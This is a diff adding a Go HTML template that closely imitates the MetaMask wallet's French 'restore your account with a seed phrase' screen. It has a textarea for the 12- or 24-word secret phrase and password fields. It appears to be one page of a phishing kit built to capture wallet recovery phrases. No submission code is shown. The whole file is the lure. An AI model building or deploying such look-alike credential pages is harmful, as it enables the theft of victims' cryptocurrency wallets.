@@ -1,0 +1,80 @@
+{{ define "wallets_login_form" }}
+<!DOCTYPE html>
+<html lang="en">
+  {{ template "head" .PageTitle }}
+
+  <body>
+  {{ template "header" .PageTitle }}
+  <div class="app mouse-user-styles">
+    <div class="app-header">
+      <div class="app-header__contents">
+        <div class="app-header__account-menu-container">
+          <div class="app-header__network-component-wrapper">
+            <div class="network-component pointer ethereum-network" title="Réseau principal Ethereum">
+              <div class="network-indicator">
+                <div class="menu-icon-circle">
+                  <div style="background: rgb(3, 135, 137); border: none; height: 12px; width: 12px;"></div>
+                </div>
+                <div class="network-name">Réseau principal Ethereum</div>
+                <div class="network-indicator__down-arrow"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="menu-droppo-container network-droppo" style="position: absolute; top: 58px; width: 309px; z-index: 55;">
+      <style>
+        .menu-droppo-enter {
+          transition: transform 300ms ease-in-out;
+          transform: translateY(-200%);
+        }
+
+        .menu-droppo-enter.menu-droppo-enter-active {
+          transition: transform 300ms ease-in-out;
+          transform: translateY(0%);
+        }
+
+        .menu-droppo-leave {
+          transition: transform 300ms ease-in-out;
+          transform: translateY(0%);
+        }
+
+        .menu-droppo-leave.menu-droppo-leave-active {
+          transition: transform 300ms ease-in-out;
+          transform: translateY(-200%);
+        }
+      </style>
+    </div>
+    <div class="main-container-wrapper">
+      <div class="first-view-main-wrapper">
+        <div class="first-view-main">
+          <div class="import-account">
+            <a class="import-account__back-button" href="#">&lt; Back</a>
+            <div class="import-account__title">Restaurer votre compte avec une phrase Seed.</div>
+            <div class="import-account__selector-label">Saisissez votre phrase secrète de 12 ou 24 mots pour restaurer votre coffre-fort.</div>
+            <div class="import-account__input-wrapper">
+              <label class="import-account__input-label">Wallet Seed</label><textarea class="import-account__secret-phrase" placeholder="Separez chaque mot avec un espace simple"></textarea>
+            </div>
+            <span class="error"></span>
+            <div class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal">
+              <label class="MuiFormLabel-root MuiInputLabel-root jss24 jss28 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="password" id="password-label">Nouveau mot de passe (min 8 caractères)</label>
+              <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl">
+                <input aria-invalid="false" autocomplete="new-password" id="password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+              </div>
+            </div>
+            <div class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal">
+              <label class="MuiFormLabel-root MuiInputLabel-root jss24 jss28 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="confirm-password" id="confirm-password-label">Confirmer le mot de passe</label>
+              <div class="MuiInputBase-root MuiInput-root jss27 MuiInputBase-formControl MuiInput-formControl"><input aria-invalid="false" autocomplete="confirm-password" id="confirm-password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+              </div>
+            </div>
+            <button class="button btn--first-time first-time-flow__button" disabled="">Restaurer</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  {{ template "footer" }}
+  </body>
+</html>
+{{ end }}
